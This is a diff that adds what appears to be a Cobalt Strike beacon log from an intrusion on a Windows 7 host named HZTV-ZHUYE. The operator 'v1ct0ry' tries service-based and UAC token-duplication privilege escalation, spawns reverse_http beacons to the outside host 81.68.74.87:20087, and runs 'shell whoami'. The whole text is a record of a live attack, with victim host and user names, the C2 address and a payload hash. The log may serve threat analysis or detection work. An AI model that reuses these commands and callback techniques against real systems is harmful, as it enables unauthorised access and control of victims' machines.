@@ -1,0 +1,18 @@
+05/25 15:12:25 UTC [metadata] 113.214.7.3 <- 10.10.160.22; computer: HZTV-ZHUYE; user: hnmc; process: cs42.exe; pid: 3180; os: Windows; version: 6.1; build: 7601; beacon arch: x64 (x64)
+05/25 15:12:49 UTC [input] <v1ct0ry> elevate svc-exe msf
+05/25 15:12:50 UTC [task] <T1035, T1050> Tasked beacon to run windows/beacon_http/reverse_http (81.68.74.87:20087) via Service Control Manager (\\127.0.0.1\ADMIN$\33b5ad0.exe)
+05/25 15:12:50 UTC [indicator] service: \\. 33b5ad0
+05/25 15:12:50 UTC [indicator] file: 5ad80f02e11c25f850c66f20fbc4a0b7 289280 bytes \\127.0.0.1\ADMIN$\33b5ad0.exe
+05/25 15:12:51 UTC [checkin] host called home, sent: 291370 bytes
+05/25 15:12:51 UTC [error] could not upload file: 5
+05/25 15:12:51 UTC [error] Could not open service control manager on .: 5
+05/25 15:13:01 UTC [input] <v1ct0ry> sleep 0
+05/25 15:13:01 UTC [task] <T1029> Tasked beacon to become interactive
+05/25 15:13:04 UTC [checkin] host called home, sent: 16 bytes
+05/25 15:13:16 UTC [input] <v1ct0ry> elevate uac-token-duplication msf
+05/25 15:13:17 UTC [task] <T1088, T1093> Tasked beacon to spawn windows/beacon_http/reverse_http (81.68.74.87:20087) in a high integrity process (token duplication)
+05/25 15:13:18 UTC [checkin] host called home, sent: 270022 bytes
+05/25 15:15:12 UTC [input] <v1ct0ry> whoami
+05/25 15:15:12 UTC [error] Unknown command: whoami
+05/25 15:15:17 UTC [input] <v1ct0ry> shell whoami
+05/25 15:15:17 UTC [task] <T1059> Tasked beacon to run: whoami
